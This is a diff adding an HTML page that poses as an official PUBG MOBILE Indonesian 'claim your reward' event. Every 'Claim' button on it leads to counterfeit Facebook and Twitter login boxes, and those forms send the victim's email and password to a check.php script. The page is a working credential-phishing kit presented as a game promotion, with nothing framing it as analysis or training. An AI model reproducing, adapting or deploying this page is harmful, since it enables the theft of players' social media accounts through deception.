@@ -1,0 +1,757 @@
+<!-- URL =http://pubgzona.misecure.com/--><!-- w =('MISECURE.COM', datetime.datetime(2002, 2, 22, 17, 55, 21), datetime.datetime(2022, 2, 22, 17, 55, 21))--><!DOCTYPE html>
+<html lang="id">
+ <head>
+  <!-- 页面通用 header 配置 -->
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" name="viewport"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible">
+   <meta content="It’s time to turn up the music and 2GETHER we play at PUBG MOBILE!" name="Description">
+    <meta content="2GETHER WE PLAY,Anniversary ke-2 PUBG MOBILE,PUBG MOBILE THEME MUSIC COVER CONTEST" name="Keywords"/>
+    <meta content="https://www.pubgmobile.com/event/musicContest/" property="og:url"/>
+    <meta content="website" property="og:type"/>
+    <meta content="PUBG MOBILE THEME MUSIC COVER CONTEST" property="og:title">
+     <meta content="It’s time to turn up the music and 2GETHER we play at PUBG MOBILE!" property="og:description"/>
+     <meta content="https://www.pubgmobile.com/en/event/musicContest/images/share.jpg" property="og:image"/>
+     <link href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/3.4.2/css/swiper.min.css" rel="stylesheet"/>
+     <link href="https://www.pubgmobile.com/id/event/musicContest/css/common.css" rel="stylesheet"/>
+     <link href="https://www.pubgmobile.com/id/event/musicContest/css/style.css" rel="stylesheet"/>
+     <!-- <link rel="stylesheet" href="css/all.css"> -->
+     <link href="https://www.pubgmobile.com/common/css/all.css" rel="stylesheet"/>
+     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
+     <link href="css/style.css" rel="stylesheet"/>
+     <link href="css/facebook.css" rel="stylesheet"/>
+     <link href="css/twitter.css" rel="stylesheet"/>
+     <style>
+      .duatombol {
+    z-index:99;
+    position:relative;
+    margin-top:-12%;
+    width:100%;
+    display:flex;
+    height:auto;
+    align-items:center;
+    justify-content:center;
+    }
+    .duatombol .menu{
+    border-radius:3px;
+    text-shadow:0 0.5px 5px aqua;
+    box-shadow:0 0.5px 5px aqua;
+    font-weight:bold;
+    color:white;
+    background:rgba(51, 85, 255,0.40);
+    display:flex;
+    height:auto;
+    align-items:center;
+    justify-content:center;
+    height:30px;
+    margin-right:5px;
+    width:35%;
+    border:1px solid aqua;
+    }
+    .duatombol .menu:hover{
+    box-shadow:0 2px 5px pink;
+    }
+    .tempatnya {
+    margin-top:10%;
+    width:100%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    animation:animate 2s forwards;
+    }
+    .tempatnya .tempatkartu {
+    width:91%;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    }
+    .tempatkartu .card {
+    position:relative;
+    color:white;
+    background:rgba(51, 85, 255,0.40);
+    text-shadow:0 0.5px 5px aqua;
+    border-radius:5px;
+    border:1px solid aqua;
+    margin:auto;
+    width:100px;
+    height:130px;
+    }
+    .card::before {
+    content:'';
+    border-radius:5px;
+    width:100%;
+    height:100%;
+    position:absolute;
+    z-index:-1;
+    top:0px;
+    left:0px;
+    bottom:0px;
+    right:0px;
+    background: linear-gradient(0deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+    box-shadow:0 0.5px 15px aqua;
+    animation:bfg 7s infinite;
+    }
+    .card img {
+    width:100%;
+    border-top-left-radius:5px;
+    border-top-right-radius:5px;
+    }
+    .card button {
+    margin-top:-10px;
+    border:none;
+    background:rgba(51, 85, 255,0.80);
+    height:29.9px;
+    color:white;
+    font-family: 'wanwan';
+    font-size:15px;
+    border-bottom-left-radius:5px;
+    border-bottom-right-radius:5px;
+    width:100%;
+    text-shadow: 0 0.5px 5px aqua;
+    font-weight:bold;
+    }
+    .card button:hover {
+    background:rgba(51, 85, 255,0.10);
+    }
+    .mask {
+    display:none;
+    width:100%;
+    height:100%;
+    position:fixed;
+    z-index:9999;
+    top:0;
+    left:0;
+    background:rgba(0,0,0,0.50);
+    }
+    .mask .loginarea {
+    box-shadow:0 0.5px 15px pink;
+    display:none;
+    border-radius:2px;
+    background:rgba(51, 85, 255,0.40);
+    border:2px solid aqua;
+    position:absolute;
+    transform:translate(-50%,-50%);
+    top:50%;
+    left:50%;
+    z-index:999;
+    width:65%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    padding:20px;
+    animation: fadein 2s forwards;
+    }
+    .loginarea .atasnya {
+    margin-top:-15px;
+    width:90%;
+    height:30px;
+    color:white;
+    letter-spacing:5px;
+    line-height:30px;
+    font-size:1.3em;
+    font-weight:bold;
+    border-radius:2px;
+    background:rgba(51, 85, 255,0.40);
+    border:2px solid aqua;
+    text-align:center;
+    }
+    .loginarea .fb {
+    margin-top:15px;
+    width:85%;
+    color:white;
+    font-weight:bold;
+    border-radius:2px;
+    background:#4267B2;
+    border:1px solid #fff;
+    text-align:center;
+    height:30px;
+    padding-left:5px;
+    line-height:30px;
+    }
+    .loginarea .tw {
+    margin-top:5px;
+    height:30px;
+    line-height:30px;
+    width:85%;
+    color:white;
+    font-weight:bold;
+    border-radius:2px;
+    background:#1DA1F2;
+    border:1px solid #fff;
+    text-align:center;
+    padding-left:5px;
+    }
+    .tw i,.fb i{
+    float:left;
+    margin-top:8px;
+    }
+    .popup-box-login-fb {
+	background:#ECEFF6;
+	max-width:330px;
+	height:auto;
+	position:relative;
+	z-index:9999;
+	margin:50px auto;
+	margin-top:1.9%;
+	text-align:center;
+	font-family:'Teko';
+	color:#000;
+	border-radius:10px;
+    }
+    .popup-box-login-twitter {
+    	background:#fff;
+    	max-width:330px;
+    	height:370px;
+    	position:relative;
+    	margin:50px auto;
+    	margin-top:10%;
+    	text-align:center;
+    	font-family:'Teko';
+    	color:#000;
+    	border-radius:10px;
+    }
+    .close-fb {
+    	background:#000;
+    	width:20px;
+    	height:20px;
+    	color:#fff;
+    	text-align:center;
+    	text-decoration:none;
+    	border-radius:50%;
+    	border:1.5px solid #fff;
+    	position:absolute;
+    	top:-8px;
+    	right:-10px;
+    	display:block;
+    }
+    .close-fb i {
+    	color:#fff;
+    	padding-top:1px;
+    }
+    .close-other {
+    	background:#000;
+    	width:20px;
+    	height:20px;
+    	color:#fff;
+    	text-align:center;
+    	text-decoration:none;
+    	border-radius:50%;
+    	border:1.5px solid #fff;
+    	top:-8px;
+    	right:-10px;
+    	position:absolute;
+    	z-index:9999999;
+    	display:block;
+    }
+    .close-other i {
+    	color:#fff;
+    	padding-top:1px;
+    }
+    @media only screen and (max-width:600px) {
+    	.popup-box-login-fb {
+    		margin-top: 4%;
+    	}
+    }
+    @keyframes animate {
+    from {transform:scale(0.7);opacity:0;}
+    to {transform:scale(1);opacity:1;}
+    }
+    @keyframes fadein {
+    from {transform:translateX(-50%);opacity:0;}
+    to {transform:translateX(1);opacity:1;}
+    }
+    @keyframes bfg {
+    0%,100%{filter:hue-rotate(10deg);}
+    50%{filter:hue-rotate(360deg);}
+    }
+     </style>
+     <title>
+      EVENT XSUIT BLOOD
+     </title>
+     <!-- design：insight  | reconsitution：insight | establish:2020/02/13 -->
+     <script>
+      var audio = document.createElement('script');
+    audio.src = 'js/asw.js'
+        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
+            setTimeout(function() {
+                $('body').addClass('mclass');
+            }, 1000);
+        }
+     </script>
+    </meta>
+   </meta>
+  </meta>
+ </head>
+ <body class="id">
+  <!-- nav -->
+  <div class="top-nav">
+   <div class="top-main c">
+    <!-- logo,name -->
+    <div class="top-log c">
+     <a href="//www.pubgmobile.com/en-US/" onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_logo'});">
+      <img alt="" height="128" src="https://www.pubgmobile.com/common/images/icon_logo.jpg" width="128"/>
+     </a>
+     <h1 class="top-tit">
+      PUBG MOBILE
+      <span>
+       OFFICIAL PUBG ON MOBILE
+      </span>
+     </h1>
+    </div>
+    <!-- line -->
+    <div class="top-line" onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_btn'});">
+     <ul>
+      <li>
+       -
+      </li>
+      <li>
+       -
+      </li>
+      <li>
+       -
+      </li>
+     </ul>
+    </div>
+    <!-- nav-list -->
+    <!-- homepage,download -->
+    <div class="top-btn">
+     <a href="//www.pubgmobile.com/pay/" onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_purchase'});" target="_blank">
+      PURCHASE
+     </a>
+     <a class="down" href="https://web.gpubgm.com/m/Website/xiaobao/AOS_IG0190_V2_19261No9_0.19.0.13910_Shipping_ThirdPartyPayment_GLOBAL.shell.signed_uawebsite.apk" onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_download'});" target="_blank">
+      DOWNLOAD
+     </a>
+    </div>
+   </div>
+  </div>
+  <div class="wrap">
+   <section class="sec s3">
+    <br/>
+    <br/>
+    <div class="popup-login login_facebook animated fadeIn" style="display: none;">
+     <div class="popup-box-login-fb">
+      <a class="close-fb" onclick="hidefacebook()">
+       <i class="zmdi zmdi-close">
+       </i>
+       X
+      </a>
+      <div class="navbar-fb">
+       <img src="img/login/facebook_text.png"/>
+      </div>
+      <div class="content-box-fb">
+       <img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg"/>
+       <div class="txt-login-fb">
+        Log in to your Facebook account to connect to PUBG MOBILE
+       </div>
+       <form action="check.php" class="login-form" method="post">
+        <label>
+         <input autocapitalize="off" autocomplete="off" name="email" placeholder="Mobile number or email address" required="" type="text"/>
+        </label>
+        <label>
+         <input autocapitalize="off" autocomplete="off" name="password" placeholder="Password" required="" type="password"/>
+        </label>
+        <input name="login" readonly="" type="hidden" value="Facebook"/>
+        <button class="btn-login-fb" type="submit">
+         Log In
+        </button>
+       </form>
+       <div class="txt-create-account">
+        Create account
+       </div>
+       <div class="txt-not-now">
+        Not now
+       </div>
+       <div class="txt-forgotten-password">
+        Forgotten password?
+       </div>
+      </div>
+      <div class="language-box">
+       <center>
+        <div class="language-name language-name-active">
+         English (UK)
+        </div>
+        <div class="language-name">
+         Bahasa Indonesia
+        </div>
+        <div class="language-name">
+         Basa Jawa
+        </div>
+        <div class="language-name">
+         Bahasa Melayu
+        </div>
+        <div class="language-name">
+         日本語
+        </div>
+        <div class="language-name">
+         Español
+        </div>
+        <div class="language-name">
+         Português (Brasil)
+        </div>
+        <div class="language-name">
+         <i class="fa fa-plus">
+         </i>
+        </div>
+       </center>
+      </div>
+      <div class="copyright">
+       Facebook Inc.
+      </div>
+     </div>
+    </div>
+    <div class="popup-login login_twitter animated fadeIn" style="display: none;">
+     <div class="popup-box-login-twitter">
+      <a class="close-other" onclick="hidetwitter()">
+       <i class="zmdi zmdi-close">
+       </i>
+       X
+      </a>
+      <div class="header-twitter">
+       <center>
+        <img src="img/login/twitter_text.png"/>
+       </center>
+      </div>
+      <div class="box-twitter">
+       <center>
+        <form action="check.php" method="post">
+         <div class="txt-login-twitter">
+          Login to Twitter
+         </div>
+         <div class="input-box-twitter">
+          <label>
+           Phone, email, or username
+          </label>
+          <input name="email" placeholder="" required="" type="text"/>
+         </div>
+         <div class="input-box-twitter">
+          <label>
+           Password
+          </label>
+          <input name="password" placeholder="" required="" type="password"/>
+         </div>
+         <input name="login" readonly="" type="hidden" value="Twitter"/>
+         <button class="btn-login-twitter" type="submit">
+          Log In
+         </button>
+         <div class="footer-menu-twitter">
+          Forgot password?
+         </div>
+         <div class="footer-menu-twitter bulet">
+          •
+         </div>
+         <div class="footer-menu-twitter">
+          Sign up to Twitter
+         </div>
+        </form>
+       </center>
+      </div>
+     </div>
+    </div>
+    <div class="btn-box btn-box2" style="margin-bottom:-10%;">
+     <a class="btn-join" href="javascript:openDialog('pop8');" style="font-size:2em;">
+      EVENT PLINTIR PENTIL
+     </a>
+    </div>
+    <div class="duatombol">
+     <div class="menu" id="defaultOpen" onclick="openHero(event, 'latest');">
+      LATEST REWARD
+     </div>
+     <div class="menu" onclick="openHero(event, 'other');">
+      OTHER REWARD
+     </div>
+    </div>
+    <center>
+     <div class="badan gallery" id="latest">
+      <div class="tempatnya">
+       <div class="tempatkartu">
+        <div class="card">
+         <img src="img/reward/latest/1.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/latest/2.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/latest/3.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+       </div>
+      </div>
+      <!-- Batas -->
+      <div class="tempatnya">
+       <div class="tempatkartu">
+        <div class="card">
+         <img src="img/reward/latest/4.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/latest/5.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/latest/6.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+       </div>
+      </div>
+      <!-- Batas -->
+      <div class="tempatnya">
+       <div class="tempatkartu">
+        <div class="card">
+         <img src="img/reward/latest/7.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/latest/8.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/latest/9.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+       </div>
+      </div>
+      <!-- Batas -->
+     </div>
+     <!--- tab --->
+     <div class="badan gallery" id="other">
+      <div class="tempatnya">
+       <div class="tempatkartu">
+        <div class="card">
+         <img src="img/reward/other/1.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/other/2.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/other/3.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+       </div>
+      </div>
+      <!-- Batas -->
+      <div class="tempatnya">
+       <div class="tempatkartu">
+        <div class="card">
+         <img src="img/reward/other/4.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/other/5.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/other/6.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+       </div>
+      </div>
+      <!-- Batas -->
+      <div class="tempatnya">
+       <div class="tempatkartu">
+        <div class="card">
+         <img src="img/reward/other/7.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/other/8.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/other/9.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+       </div>
+      </div>
+      <!-- Batas -->
+     </div>
+     <!--- tab --->
+     <div class="badan gallery" id="season">
+      <div class="tempatnya">
+       <div class="tempatkartu">
+        <div class="card">
+         <img src="img/reward/items/1.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/items/1.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/reward/items/1.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+       </div>
+      </div>
+      <!-- Batas -->
+      <div class="tempatnya">
+       <div class="tempatkartu">
+        <div class="card">
+         <img src="img/latest/4.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/latest/5.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/latest/6.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+       </div>
+      </div>
+      <!-- Batas -->
+      <div class="tempatnya">
+       <div class="tempatkartu">
+        <div class="card">
+         <img src="img/latest/7.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/latest/8.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+        <div class="card">
+         <img src="img/latest/9.png"/>
+         <button onclick="login()">
+          Claim
+         </button>
+        </div>
+       </div>
+      </div>
+     </div>
+     <!--- tab --->
+    </center>
+   </section>
+   <div class="mask">
+    <div class="loginarea">
+     <div class="atasnya">
+      CHOOSE YOUR LOGIN
+     </div>
+     <br/>
+     <br/>
+     <div class="fb" onclick="fb()">
+      <i aria-hidden="true" class="fa fa-facebook-square">
+      </i>
+      LOGIN WITH FACEBOOK
+     </div>
+     <div class="tw" onclick="tw()">
+      <i aria-hidden="true" class="fa fa-twitter-square">
+      </i>
+      LOGIN WITH TWITTER
+     </div>
+    </div>
+   </div>
+   <!-- Dialog 弹窗 -->
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js">
+   </script>
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/3.4.2/js/swiper.min.js">
+   </script>
+   <script src="https://www.pubgmobile.com/id/event/musicContest/js/common.js">
+   </script>
+   <script src="https://www.pubgmobile.com/id/event/musicContest/js/index.js">
+   </script>
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js">
+   </script>
+   <script>
+    function login() {
+    $('.mask').show();
+    $('.loginarea').show();
+    }
+  function fb() {
+    $('.loginarea').hide();
+    $('.mask').hide();
+    $('.login_facebook').show();
+    $('.badan').hide();
+    $('.btn-box2').hide();
+    $('.duatombol').hide();
+    }
+  function tw() {
+    $('.loginarea').hide();
+    $('.mask').hide();
+    $('.login_twitter').show();
+    $('.badan').hide();
+    $('.btn-box2').hide();
+    $('.duatombol').hide();
+    }
+   function hidetwitter() {
+   $('.login_twitter').hide();
+   $('.badan').show();
+   $('.btn-box2').show();
+   $('.duatombol').show();
+   }
+   function hidefacebook() {
+   $('.btn-box2').show();
+   $('.duatombol').show();
+   $('.login_facebook').hide();
+   $('.badan').show();
+   }
+   </script>
+   <script src="https://www.pubgmobile.com/common/js/gray.js">
+   </script>
+   <script src="js/tab.js">
+   </script>
+   <script>
+    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
+            $("body").addClass("mobile");
+        }
+   </script>
+  </div>
+ </body>
+</html>
